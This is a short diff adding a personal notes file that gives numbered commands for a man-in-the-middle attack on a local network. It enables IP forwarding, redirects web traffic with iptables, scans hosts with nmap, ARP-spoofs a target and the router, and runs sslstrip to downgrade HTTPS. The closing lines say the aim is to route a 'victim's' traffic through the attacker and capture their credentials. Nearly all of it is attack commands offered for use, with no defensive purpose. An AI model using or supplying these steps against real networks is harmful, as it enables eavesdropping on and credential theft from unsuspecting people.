@@ -1,0 +1,19 @@
+1. echo 1 > /proc/sys/net/ipv4/ip_forward
+   default is zero(0)
+2. iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+   redirects the port --something about firewall
+   conform that 2nd commnad works
+   iptables -t nat -L PREROUTING
+3. nmap 192.168.1.2-254 -vv
+   scan the devices which are up
+4. iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+   open port 8080
+5. arpspoof -i wlan0 -t 192.168.2.1 -r 192.168.2.2 //target ip
+   arpspoof -i wlan0 -t 192.168.2.2 -r 192.168.2.1 //router ip
+6. sslstrip -l 8080
+   tail -f sslstrip.log
+
+
+This will redirect all the trafic of victim through your computer and by applying
+6th command you will remove encryption (https to http) for some of the sites and 
+may capture victim's crendintials.
